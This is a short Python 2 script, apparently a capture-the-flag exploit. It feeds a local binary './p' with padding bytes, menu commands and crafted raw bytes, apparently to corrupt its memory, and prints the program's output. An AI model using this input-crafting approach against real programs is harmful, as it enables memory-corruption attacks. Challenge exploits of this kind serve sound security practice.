"""print "0naber"
print "1 0"
print '0\x34\x0a\x40'
print "2"
"""


import subprocess

proc=subprocess.Popen('./p', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)

proc.stdin.write('0'+'a'*32)
proc.stdin.flush()
proc.stdin.write('1 0\n')
proc.stdin.flush()
proc.stdin.write('0\x24\x0a\x40'+'\x00'*29)
proc.stdin.flush()
proc.stdin.write('2\n')
proc.stdin.flush()

#while True:
#	print proc.stdout.readline(),
#while True:
print proc.communicate()[0],
